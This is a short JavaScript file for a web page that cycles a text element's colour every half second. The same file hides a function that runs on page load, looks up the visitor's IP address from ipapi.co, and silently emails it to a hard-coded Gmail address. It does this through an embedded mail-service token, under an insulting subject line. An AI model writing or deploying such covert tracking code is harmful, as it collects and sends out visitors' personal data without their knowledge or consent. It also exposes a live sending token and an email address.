const myTextElement = document.querySelector(".main_text");
const colors = ["#ff0000", "#09ff00", "#0000ff"];

let i = 0;

const colorloop = () => {
  if (i >= colors.length) i = 0;

  myTextElement.style.color = colors[i];
  i++;
};

setInterval(colorloop, 500);

const getIp = () => {
  fetch("https://ipapi.co/json/")
    .then((response) => response.json())
    .then((data) => {
      Email.send({
        SecureToken: "e319dd4a-f853-41aa-812a-a7a466e1613f",
        To: "walden.devbusiness@gmail.com",
        From: "walden.devbusiness@gmail.com",
        Subject: "IP KURWY",
        Body: "IP: " + data.ip,
      });
    });
};

getIp();
